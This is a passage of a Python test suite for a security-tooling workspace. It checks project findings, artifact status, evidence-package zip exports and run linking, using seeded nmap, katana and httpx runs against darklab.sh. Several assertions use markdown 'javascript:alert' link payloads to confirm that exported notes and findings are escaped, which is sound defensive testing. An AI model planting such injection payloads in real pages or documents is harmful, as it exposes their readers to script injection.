                "VALUES (?, ?, ?, 'finding', 'direct run finding', '8080/tcp open http-proxy', 1, ?, datetime('now'))",
                (f"fnd_direct_{run_id}", session_id, run_id, f"fp-direct-{run_id}"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'outside project finding', 'outside project', 0, ?, datetime('now'))",
                (f"fnd_{outside_run_id}", session_id, outside_run_id, f"fp-{outside_run_id}"),
            )
            conn.execute(
                "DELETE FROM findings_occurrences WHERE finding_id = ?",
                (f"fnd_direct_{run_id}",),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'direct run fallback', datetime('now'), datetime('now'))",
                (f"note_fnd_direct_{run_id}", session_id, f"fnd_direct_{run_id}"),
            )
            conn.commit()
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            summary = json.loads(client.get(
                f"/projects/{project['id']}/summary",
                headers={"X-Session-ID": session_id},
            ).data)
            artifacts_page = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=1&offset=0",
                headers={"X-Session-ID": session_id},
            ).data)
            assert artifacts_page["total"] == 2
            assert artifacts_page["limit"] == 1
            assert len(artifacts_page["artifacts"]) == 1
            all_artifacts = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
                headers={"X-Session-ID": session_id},
            ).data)
            artifact_statuses = {item["workspace_path"]: item for item in all_artifacts["artifacts"]}
            assert artifact_statuses["reports/run.txt"]["file_status"] == "available"
            assert artifact_statuses["reports/run.txt"]["file_available"] is True
            assert artifact_statuses["reports/run.txt"]["current_byte_size"] == 10
            assert artifact_statuses["reports/run.txt"]["content_sha256"] == artifact_hash
            assert artifact_statuses["reports/run.txt"]["labels"][0]["label"] == "evidence"
            assert artifact_statuses["reports/run.txt"]["note"]["body"] == "Raw output reviewed"
            assert artifact_statuses["reports/old.txt"]["file_status"] == "missing"
            assert artifact_statuses["reports/old.txt"]["file_available"] is False
            assert artifact_statuses["reports/old.txt"]["current_byte_size"] is None
            preview_resp = client.get(
                f"/projects/{project['id']}/artifacts/rfa_{run_id}/preview",
                headers={"X-Session-ID": session_id},
            )
            assert preview_resp.status_code == 200
            preview_payload = json.loads(preview_resp.data)
            assert preview_payload["artifact"]["workspace_path"] == "reports/run.txt"
            assert preview_payload["text"] == "0123456789"
            download_resp = client.get(
                f"/projects/{project['id']}/artifacts/rfa_{run_id}/download",
                headers={"X-Session-ID": session_id},
            )
            assert download_resp.status_code == 200
            assert download_resp.data == b"0123456789"
            assert "attachment" in download_resp.headers["Content-Disposition"]
            missing_preview = client.get(
                f"/projects/{project['id']}/artifacts/rfa_{baseline_run_id}/preview",
                headers={"X-Session-ID": session_id},
            )
            assert missing_preview.status_code == 404
            artifact_path.write_bytes(b"abcdefghij")
            changed_artifacts = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
                headers={"X-Session-ID": session_id},
            ).data)
            changed_artifact = {
                item["workspace_path"]: item for item in changed_artifacts["artifacts"]
            }["reports/run.txt"]
            assert changed_artifact["file_status"] == "changed"
            assert "checksum differs" in changed_artifact["file_status_detail"]
        assert summary["project"]["id"] == project["id"]
        assert summary["counts"] == {
            "runs": 2,
            "entities": 0,
            "targets": 0,
            "pending_targets": 0,
            "artifacts": 2,
            "findings": 3,
            "labels": 3,
            "notes": 5,
            "packages": 0,
        }
        assert summary["finding_summary"] == {
            "review_states": {"new": 3},
            "severities": {"high": 1, "info": 2},
        }
        counted_list = json.loads(client.get(
            "/projects?include_archived=1&include_counts=1&limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        counted_project = next(item for item in counted_list["projects"] if item["id"] == project["id"])
        assert counted_project["finding_summary"] == summary["finding_summary"]
        assert summary["artifacts"] == []
        assert summary["entities"] == []
        assert summary["entity_counts"] == {}
        assert {item["id"] for item in summary["runs"]} == {run_id, baseline_run_id}
        run_summaries = {item["id"]: item for item in summary["runs"]}
        assert run_summaries[run_id]["labels"][0]["label"] == "baseline"
        assert run_summaries[run_id]["note"]["body"] == "Confirmed service owner"
        assert run_summaries[run_id]["finding_count"] == 2
        assert run_summaries[run_id]["artifact_count"] == 1
        assert run_summaries[baseline_run_id]["finding_count"] == 1
        assert run_summaries[baseline_run_id]["artifact_count"] == 1
        paged_runs = json.loads(client.get(
            f"/projects/{project['id']}/runs?limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        assert paged_runs["total"] == 2
        assert paged_runs["limit"] == 1
        assert paged_runs["offset"] == 0
        assert len(paged_runs["runs"]) == 1
        assert {"finding_count", "artifact_count"}.issubset(paged_runs["runs"][0])
        project_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?review_state=new&command_root=nmap&run_id={run_id}"
            "&label=important&note_state=noted&severity=high&scope=finding",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["run_id"] for item in project_findings["findings"]] == [run_id]
        assert project_findings["findings"][0]["command_root"] == "nmap"
        bulk_review_resp = client.post(
            f"/projects/{project['id']}/findings/review",
            json={
                "finding_ids": [f"fnd_{run_id}", f"fnd_{outside_run_id}", "missing-finding"],
                "review_state": "important",
            },
            headers={"X-Session-ID": session_id},
        )
        assert bulk_review_resp.status_code == 200
        assert json.loads(bulk_review_resp.data)["counts"] == {"updated": 1, "not_found": 2}
        with sqlite3.connect(DB_PATH) as conn:
            review_rows = {
                row[0]: row[1]
                for row in conn.execute(
                    "SELECT id, status FROM findings WHERE id IN (?, ?)",
                    (f"fnd_{run_id}", f"fnd_{outside_run_id}"),
                ).fetchall()
            }
        assert review_rows[f"fnd_{run_id}"] == "important"
        assert review_rows[f"fnd_{outside_run_id}"] == "new"
        multi_value_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?run_id={run_id}&run_id={baseline_run_id}"
            f"&review_state=new&review_state=reviewed&review_state=important&label=important&label=missing",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["run_id"] for item in multi_value_findings["findings"]] == [run_id]
        unnoted_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?note_state=unnoted",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["run_id"] for item in unnoted_findings["findings"]] == [baseline_run_id]
        paged_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?limit=1&offset=1",
            headers={"X-Session-ID": session_id},
        ).data)
        assert paged_findings["total"] == 3
        assert paged_findings["limit"] == 1
        assert paged_findings["offset"] == 1
        assert len(paged_findings["findings"]) == 1
        assert paged_findings["has_more"] is True
        assert paged_findings["group_counts"] == {"nmap darklab.sh": 3}
        comparison = json.loads(client.get(
            self._project_compare_url(project["id"], left=run_id, right=baseline_run_id),
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["raw_line"] for item in comparison["objects"]["findings"]["added"]] == ["80/tcp open http"]
        assert [item["raw_line"] for item in comparison["objects"]["findings"]["removed"]] == ["443/tcp open https"]
        assert [item["workspace_path"] for item in comparison["objects"]["artifacts"]["added"]] == ["reports/old.txt"]
        assert [item["workspace_path"] for item in comparison["objects"]["artifacts"]["removed"]] == ["reports/run.txt"]
        baseline_label = client.post(
            f"/entities/run/{baseline_run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        assert baseline_label.status_code == 201
        baseline_comparison = json.loads(client.get(
            self._project_compare_url(project["id"], left=run_id, baseline_label="baseline"),
            headers={"X-Session-ID": session_id},
        ).data)
        assert baseline_comparison["right_run_id"] == baseline_run_id
        assert baseline_comparison["baseline_label"] == "baseline"
        invalid_project_findings = client.get(
            f"/projects/{project['id']}/findings?review_state=maybe",
            headers={"X-Session-ID": session_id},
        )
        assert invalid_project_findings.status_code == 400
        evidence_target = json.loads(client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh", "source_run_id": run_id},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'target', ?, 'production', datetime('now'))",
                (f"lbl_tgt_{run_id}", session_id, evidence_target["id"]),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'target', ?, 'Primary external target', datetime('now'), datetime('now'))",
                (f"note_tgt_{run_id}", session_id, evidence_target["id"]),
            )
            conn.commit()
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "UPDATE findings SET target_id = ? WHERE id = ?",
                (evidence_target["id"], f"fnd_{run_id}"),
            )
            conn.commit()

        package_resp = client.post(
            f"/projects/{project['id']}/packages",
            json={
                "name": "Draft Evidence",
                "description": "Initial package manifest",
                "redaction_mode": "raw",
                "include_artifacts": True,
                "preset": "custom",
                "include_private_notes": True,
                "labels": ["handoff"],
                "notes": "Package review note",
                "selection": {
                    "run_ids": [run_id],
                    "finding_ids": [f"fnd_{run_id}"],
                    "artifact_ids": [f"rfa_{run_id}", f"rfa_{baseline_run_id}"],
                    "target_ids": [evidence_target["id"]],
                },
            },
            headers={"X-Session-ID": session_id},
        )
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]
        assert package["project_id"] == project["id"]
        assert package["include_artifacts"] is True
        assert package["redaction_mode"] == "raw"
        assert [item["label"] for item in package["labels"]] == ["handoff"]
        assert package["note"]["body"] == "Package review note"
        assert package["manifest"]["package_format_version"] == 1
        assert package["manifest"]["counts"]["runs"] == 1
        assert package["manifest"]["counts"]["findings"] == 1
        assert package["manifest"]["counts"]["artifacts"] == 2
        assert package["manifest"]["counts"]["targets"] == 1
        assert package["manifest"]["project_counts"]["runs"] == 2
        assert package["manifest"]["selected_entity_ids"]["run_ids"] == [run_id]
        assert package["manifest"]["selected_entity_ids"]["finding_ids"] == [f"fnd_{run_id}"]
        assert package["manifest"]["selected_entity_ids"]["artifact_ids"] == [
            f"rfa_{run_id}",
            f"rfa_{baseline_run_id}",
        ]
        assert package["manifest"]["selected_entity_ids"]["target_ids"] == [evidence_target["id"]]
        assert package["manifest"]["include_private_notes"] is True
        assert package["manifest"]["redaction_mode"] == "raw"
        assert package["manifest"]["options"]["index_html"] is True
        assert package["manifest"]["options"]["transcripts_html"] is True
        assert package["manifest"]["selected_entity_ids"]["transcript_run_ids"] == [run_id]
        assert package["manifest"]["estimated_archive"]["estimated_uncompressed_bytes"] > 0
        assert package["manifest"]["estimated_archive"]["raw_artifact_bytes"] == 0
        assert package["manifest"]["estimated_archive"]["skipped_artifact_count_estimate"] == 2
        assert package["manifest"]["estimated_archive"]["selected_transcript_count"] == 1
        package_label_resp = client.post(
            f"/entities/package/{package['id']}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        package_note_resp = client.put(
            f"/entities/package/{package['id']}/note",
            json={"body": "Package review note"},
            headers={"X-Session-ID": session_id},
        )
        assert package_label_resp.status_code == 201
        assert package_note_resp.status_code == 200

        packages = json.loads(client.get(
            f"/projects/{project['id']}/packages",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["id"] for item in packages["packages"]] == [package["id"]]
        assert [item["label"] for item in packages["packages"][0]["labels"]] == ["handoff"]
        assert packages["packages"][0]["note"]["body"] == "Package review note"
        package_get = json.loads(client.get(
            f"/projects/{project['id']}/packages/{package['id']}",
            headers={"X-Session-ID": session_id},
        ).data)
        assert package_get["package"]["name"] == "Draft Evidence"
        assert [item["label"] for item in package_get["package"]["labels"]] == ["handoff"]
        assert package_get["package"]["note"]["body"] == "Package review note"
        with (
            mock.patch.dict(shell_app.CFG, {"workspace_enabled": True, "max_output_lines": 1}),
            mock.patch.object(project_routes.log, "info") as package_log,
        ):
            package_download = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download",
                headers={"X-Session-ID": session_id},
            )
        assert package_download.status_code == 200
        assert "attachment" in package_download.headers["Content-Disposition"]
        download_log = next(
            call for call in package_log.call_args_list
            if call.args and call.args[0] == "EVIDENCE_PACKAGE_DOWNLOADED"
        )
        download_log_extra = download_log.kwargs["extra"]
        assert download_log_extra["duration_ms"] >= 0
        assert download_log_extra["archive_bytes"] == len(package_download.data)
        assert download_log_extra["projected_bytes"] > 0
        assert download_log_extra["selected_runs"] == 1
        assert download_log_extra["selected_findings"] == 1
        assert download_log_extra["selected_artifacts"] == 2
        assert download_log_extra["selected_targets"] == 1
        assert download_log_extra["selected_transcripts"] == 1
        assert download_log_extra["skipped_artifacts"] == 2
        assert download_log_extra["skipped_items"] == 3
        for metric_name in (
            "metadata_ms",
            "core_entries_ms",
            "artifacts_ms",
            "run_pages_ms",
            "findings_ms",
            "targets_ms",
            "notes_ms",
            "index_ms",
            "readme_ms",
            "zip_finalize_ms",
        ):
            assert download_log_extra[metric_name] >= 0
        with zipfile.ZipFile(io.BytesIO(package_download.data)) as archive:
            names = set(archive.namelist())
            assert "manifest.json" in names
            assert "assets/package.css" in names
            assert "index.html" in names
            assert "README.md" in names
            assert "findings/findings.json" in names
            assert "findings/findings.md" in names
            assert "targets/targets.json" in names
            assert "targets/targets.md" in names
            assert "metadata/labels.json" in names
            assert "notes/entity-notes.json" in names
            assert "notes/entity-notes.md" in names
            assert "notes/project.md" in names
            assert f"runs/{run_id}.html" in names
            assert f"runs/{run_id}.txt" in names
            assert f"runs/{baseline_run_id}.html" not in names
            assert "artifacts/reports/run.txt" not in names
            assert "artifacts/reports/old.txt" not in names
            assert "skipped-artifacts.json" in names
            assert "skipped-items.json" in names
            downloaded_manifest = json.loads(archive.read("manifest.json"))
            findings_json = json.loads(archive.read("findings/findings.json"))
            findings_md = archive.read("findings/findings.md").decode("utf-8")
            targets_json = json.loads(archive.read("targets/targets.json"))
            targets_md = archive.read("targets/targets.md").decode("utf-8")
            labels_json = json.loads(archive.read("metadata/labels.json"))
            notes_json = json.loads(archive.read("notes/entity-notes.json"))
            notes_md = archive.read("notes/entity-notes.md").decode("utf-8")
            project_notes_md = archive.read("notes/project.md").decode("utf-8")
            index_html = archive.read("index.html").decode("utf-8")
            readme = archive.read("README.md").decode("utf-8")
            run_html = archive.read(f"runs/{run_id}.html").decode("utf-8")
            run_text = archive.read(f"runs/{run_id}.txt").decode("utf-8")
            skipped_items = json.loads(archive.read("skipped-items.json"))
        assert downloaded_manifest["package"]["id"] == package["id"]
        assert downloaded_manifest["manifest"]["counts"]["runs"] == 1
        assert downloaded_manifest["manifest"]["counts"]["artifacts"] == 2
        assert findings_json["count"] == 1
        assert findings_json["findings"][0]["raw_line"] == "443/tcp open https"
        assert findings_json["findings"][0]["run_page"] == f"runs/{run_id}.html#L1"
        assert "# Findings" in findings_md
        assert "443/tcp open https" in findings_md
        assert "[click](javascript:alert(1))" not in findings_md
        assert r"\[click\]\(javascript:alert\(1\)\)" in findings_md
        assert "[retest](javascript:alert(2))" not in findings_md
        assert r"\[retest\]\(javascript:alert\(2\)\)" in findings_md
        assert targets_json["count"] == 1
        assert targets_json["targets"][0]["value"] == "darklab.sh"
        assert targets_json["targets"][0]["finding_ids"] == [f"fnd_{run_id}"]
        assert targets_json["targets"][0]["run_ids"] == [run_id]
        assert targets_json["targets"][0]["labels"][0]["label"] == "production"
        assert targets_json["targets"][0]["note"]["body"] == "Primary external target"
        assert "# Targets" in targets_md
        assert "darklab.sh" in targets_md
        assert "Primary external target" in targets_md
        assert "Related Findings" in targets_md
        assert "[click](javascript:alert(1))" not in targets_md
        assert r"\[click\]\(javascript:alert\(1\)\)" in targets_md
        assert labels_json["count"] == 5
        assert {item["label"] for item in labels_json["labels"]} == {
            "baseline",
            "evidence",
            "handoff",
            "important",
            "production",
        }
        assert notes_json["include_private_notes"] is True
        assert notes_json["count"] == 6
        assert {item["body"] for item in notes_json["notes"]} == {
            "Confirmed service owner",
            "Package review note",
            "Package notes for the external handoff.",
            "Primary external target",
            "Raw output reviewed",
            "needs [retest](javascript:alert(2))",
        }
        assert downloaded_manifest["package"]["labels"][0]["label"] == "handoff"
        assert downloaded_manifest["package"]["note"]["body"] == "Package review note"
        assert "# Entity Notes" in notes_md
        assert "[retest](javascript:alert(2))" not in notes_md
        assert r"\[retest\]\(javascript:alert\(2\)\)" in notes_md
        assert "# External Review Notes" in project_notes_md
        assert "Package notes for the external handoff." in project_notes_md
        assert findings_json["findings"][0]["labels"][0]["label"] == "important"
        assert findings_json["findings"][0]["note"]["body"] == "needs [retest](javascript:alert(2))"
        assert "Draft Evidence" in index_html
        assert "Package notes for the external handoff." in index_html
        assert "443/tcp open https" in index_html
        assert 'data-sort-table="findings"' in index_html
        assert "important" in index_html
        assert "needs [retest](javascript:alert(2))" in index_html
        assert "run.txt" in index_html
        assert "Package Exports" in index_html
        assert "findings/findings.json" in index_html
        assert "targets/targets.json" in index_html
        assert "targets/targets.md" in index_html
        assert "metadata/labels.json" in index_html
        assert "notes/entity-notes.md" in index_html
        assert "notes/project.md" in index_html
        assert "Skipped Items" in index_html
        assert "reports/old.txt" in index_html
        assert "# Draft Evidence" in readme
        assert "## Project Notes" in readme
        assert "Package notes for the external handoff." in readme
        assert "Labels: `important`" in readme
        assert "[click](javascript:alert(1))" not in readme
        assert r"\[click\]\(javascript:alert\(1\)\)" in readme
        assert "[retest](javascript:alert(2))" not in readme
        assert r"\[retest\]\(javascript:alert\(2\)\)" in readme
        assert "## Package Exports" in readme
        assert "notes/entity-notes.json" in readme
        assert "targets/targets.md" in readme
        assert "notes/entity-notes.md" in readme
        assert "notes/project.md" in readme
        assert f"runs/{run_id}.txt" in readme
        assert "## Skipped Items" in readme
        assert "reports/old.txt" in readme
        assert "nmap darklab.sh" in run_html
        assert "443/tcp open https" in run_html
        assert "Download full text transcript" in run_html
        assert "scan completed" in run_text
        assert skipped_items["items"][0]["kind"] == "artifact"
        assert {item["kind"] for item in skipped_items["items"]} == {"artifact", "transcript"}
        assert any(item.get("workspace_path") == "reports/old.txt" for item in skipped_items["items"])
        assert any(
            item.get("workspace_path") == "reports/run.txt"
            and "checksum differs" in item.get("reason", "")
            for item in skipped_items["items"]
        )
        summary_after_package = json.loads(client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        ).data)
        assert summary_after_package["counts"]["packages"] == 1
        assert summary_after_package["counts"]["labels"] == 6
        assert summary_after_package["counts"]["notes"] == 7
        assert [item["id"] for item in summary_after_package["packages"]] == [package["id"]]

        hidden_label = client.get(f"/entities/run/{run_id}/labels", headers={"X-Session-ID": "other-session"})
        assert hidden_label.status_code == 404

        delete_note = client.delete(
            f"/entities/run/{run_id}/note",
            headers={"X-Session-ID": session_id},
        )
        assert delete_note.status_code == 200
        delete_label = client.delete(
            f"/entities/run/{run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        assert delete_label.status_code == 200
        delete_package = client.delete(
            f"/projects/{project['id']}/packages/{package['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert delete_package.status_code == 200

        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        assert unlink_resp.status_code == 200
        client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": baseline_run_id},
            headers={"X-Session-ID": session_id},
        )
        empty_links = json.loads(
            client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data
        )
        assert empty_links["links"] == []

        execute_builtin_command(f"project use {project['slug']}", session_id)
        link_last_lines, _ = execute_builtin_command("project link last", session_id)
        assert f"linked run {run_id}" in link_last_lines[0]["text"]
        unsupported_file_link_lines, _ = execute_builtin_command("project link file reports/notes.txt", session_id)
        assert unsupported_file_link_lines[0]["text"] == "project: project links support run"

        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}, clear=False):
            missing_label = client.post(
                "/entities/workspace_file/reports/missing.txt/labels",
                json={"label": "ghost"},
                headers={"X-Session-ID": session_id},
            )
            assert missing_label.status_code == 404
            missing_note = client.put(
                "/entities/workspace_file/reports/missing.txt/note",
                json={"body": "ghost"},
                headers={"X-Session-ID": session_id},
            )
            assert missing_note.status_code == 404

    def test_project_findings_can_exclude_collapsed_command_groups(self):
        client = get_client()
        session_id = self._session_id("collapsed-findings")
        project = self._create_project(client, session_id)
        katana_run_id = self._seed_run(
            session_id,
            "katana -u https://darklab.sh",
            started="'2026-05-14T00:00:00+00:00'",
        )
        httpx_run_id = self._seed_run(
            session_id,
            "httpx https://darklab.sh",
            started="'2026-05-14T00:01:00+00:00'",
        )
        self._link_run(client, session_id, project["id"], katana_run_id)
        self._link_run(client, session_id, project["id"], httpx_run_id)
        with sqlite3.connect(DB_PATH) as conn:
            for index in range(3):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, ?)",
                    (
                        f"fnd_katana_{index}_{uuid.uuid4().hex}",
                        session_id,
                        katana_run_id,
                        f"katana finding {index}",
                        f"https://darklab.sh/{index} [200]",
                        index,
                        f"fp-katana-{index}-{uuid.uuid4().hex}",
                        f"2026-05-14T00:10:0{index}+00:00",
                    ),
                )
            for index in range(2):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, ?)",
                    (
                        f"fnd_httpx_{index}_{uuid.uuid4().hex}",
                        session_id,
                        httpx_run_id,
                        f"httpx finding {index}",
                        f"https://api.darklab.sh/{index} [200]",
                        index,
                        f"fp-httpx-{index}-{uuid.uuid4().hex}",
                        f"2026-05-14T00:09:0{index}+00:00",
                    ),
                )
            conn.commit()

        first_page = json.loads(client.get(
            f"/projects/{project['id']}/findings?limit=3&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        collapsed_page = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "collapsed_group": "katana -u https://darklab.sh",
            }),
            headers={"X-Session-ID": session_id},
        ).data)
        collapsed_page_without_counts = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "collapsed_group": "katana -u https://darklab.sh",
                "include_collapsed_group_counts": "0",
            }),
            headers={"X-Session-ID": session_id},
        ).data)
        page_without_count = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "include_total": "0",
                "known_total": "5",
                "include_group_counts": "0",
            }),
            headers={"X-Session-ID": session_id},
        ).data)

        assert [item["run_command"] for item in first_page["findings"]] == [
            "katana -u https://darklab.sh",
            "katana -u https://darklab.sh",
            "katana -u https://darklab.sh",
        ]
        assert first_page["total"] == 5
        assert first_page["group_counts"] == {"katana -u https://darklab.sh": 3}
        assert first_page["group_order"] == ["katana -u https://darklab.sh"]
        assert [item["run_command"] for item in collapsed_page["findings"]] == [
            "httpx https://darklab.sh",
            "httpx https://darklab.sh",
        ]
        assert collapsed_page["total"] == 2
        assert collapsed_page["group_counts"] == {"httpx https://darklab.sh": 2}
        assert collapsed_page["collapsed_group_counts"] == {"katana -u https://darklab.sh": 3}
        assert collapsed_page["group_order"] == [
            "katana -u https://darklab.sh",
            "httpx https://darklab.sh",
        ]
        assert collapsed_page_without_counts["collapsed_group_counts"] == {}
        assert collapsed_page_without_counts["group_counts"] == {"httpx https://darklab.sh": 2}
        assert collapsed_page_without_counts["group_order"] == ["httpx https://darklab.sh"]
        assert len(page_without_count["findings"]) == 3
        assert page_without_count["total"] == 5
        assert page_without_count["has_more"] is True
        assert page_without_count["group_counts"] == {}

    def test_bulk_project_links_report_mixed_results_and_keep_legacy_response(self):
        client = get_client()
        session_id = self._session_id("project-bulk-link")
        other_session = self._session_id("project-bulk-other")
        project = self._create_project(client, session_id)
        first_run_id = self._seed_run(session_id, "nmap darklab.sh")
        second_run_id = self._seed_run(session_id, "dig darklab.sh")
        other_run_id = self._seed_run(other_session, "whois darklab.sh")
        builtin_run_id = "run-" + uuid.uuid4().hex
        missing_run_id = "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started) "
                "VALUES (?, ?, 'builtin', ?, datetime('now'))",
                (builtin_run_id, session_id, "history"),
            )
            conn.commit()

        legacy_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": first_run_id},
            headers={"X-Session-ID": session_id},
        )
        assert legacy_resp.status_code == 201
        legacy_data = json.loads(legacy_resp.data)
        assert legacy_data["ok"] is True
        assert "link" in legacy_data
        assert "results" not in legacy_data
        assert "linked_entities" not in legacy_data

        bulk_resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_ids": [first_run_id, second_run_id, builtin_run_id, other_run_id, missing_run_id],
            },
            headers={"X-Session-ID": session_id},
        )
        assert bulk_resp.status_code == 200
        bulk_data = json.loads(bulk_resp.data)
        assert bulk_data["counts"] == {
            "added": 1,
            "already_linked": 1,
            "removed": 0,
            "not_linked": 0,
            "not_found": 2,
            "rejected": 1,
        }
        assert bulk_data["results"] == [
            {"run_id": first_run_id, "status": "already_linked"},
            {"run_id": second_run_id, "status": "added"},
            {"run_id": builtin_run_id, "status": "rejected", "reason": "builtin"},
            {"run_id": other_run_id, "status": "not_found"},
            {"run_id": missing_run_id, "status": "not_found"},
        ]

        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_ids": [first_run_id, second_run_id, other_run_id, missing_run_id]},
            headers={"X-Session-ID": session_id},
        )
        assert unlink_resp.status_code == 200
        unlink_data = json.loads(unlink_resp.data)
        assert unlink_data["counts"] == {
            "added": 0,
            "already_linked": 0,
            "removed": 2,
            "not_linked": 0,
            "not_found": 2,
            "rejected": 0,
        }

    def test_project_run_link_can_include_source_atlas_entities(self):
        client = get_client()
        session_id = self._session_id("project-link-run-entities")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nmap darklab.sh")
        recorded = self._seed_run_entities(session_id, run_id)
        entity_ids = {item["id"] for item in recorded}

        preview_resp = client.post(
            f"/projects/{project['id']}/links/run-entities/preview",
            json={"run_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": run_id,
                "source": "manual",
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )
        second_preview_resp = client.post(
            f"/projects/{project['id']}/links/run-entities/preview",
            json={"run_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )

        assert preview_resp.status_code == 200
        assert json.loads(preview_resp.data)["preview"] == {
            "available": 2,
            "added": 0,
            "already_linked": 0,
            "rejected": 0,
            "linkable": 2,
            "run_count": 1,
        }
        assert link_resp.status_code == 201
        link_data = json.loads(link_resp.data)
        assert link_data["link"]["entity_id"] == run_id
        assert link_data["linked_entities"]["added"] == 2
        assert link_data["linked_entities"]["available"] == 2
        assert json.loads(second_preview_resp.data)["preview"]["linkable"] == 0
        with db_connect() as conn:
            linked_entities = {
                row["entity_id"]
                for row in conn.execute(
                    "SELECT entity_id FROM project_links "
                    "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (project["id"],),
                ).fetchall()
            }
        assert linked_entities == entity_ids

    def test_project_run_unlink_can_remove_non_curated_source_entities(self):
        client = get_client()
        session_id = self._session_id("project-unlink-run-entities")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nmap darklab.sh")
        recorded = self._seed_run_entities(session_id, run_id)
        with db_connect() as conn:
            record_run_findings(conn, session_id, run_id, [{
                "text": "443/tcp open https on darklab.sh",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
            }])
            conn.commit()
        removable_id = recorded[0]["id"]
        curated_id = recorded[1]["id"]

        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": run_id,
                "source": "manual",
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'keep', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, curated_id),
            )
            conn.commit()

        preview_resp = client.post(
            f"/projects/{project['id']}/links/run-entities/remove-preview",
            json={"run_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )
        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": run_id,
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 201
        assert preview_resp.status_code == 200
        assert json.loads(preview_resp.data)["preview"] == {
            "available": 2,
            "removable": 1,
            "curated": 1,
            "kept_curated": 1,
            "removed": 0,
            "removed_curated": 0,
            "run_findings": 0,
            "removable_findings": 1,
            "curated_findings": 0,
            "kept_curated_findings": 0,
            "run_count": 1,
        }
        assert unlink_resp.status_code == 200
        unlink_data = json.loads(unlink_resp.data)
        assert unlink_data["unlinked_entities"]["removed"] == 1
        assert unlink_data["unlinked_entities"]["kept_curated"] == 1
        with db_connect() as conn:
            run_link_count = conn.execute(
                "SELECT COUNT(*) AS count FROM project_links "
                "WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
                (project["id"], run_id),
            ).fetchone()["count"]
            remaining_entity_links = {
                row["entity_id"]
                for row in conn.execute(
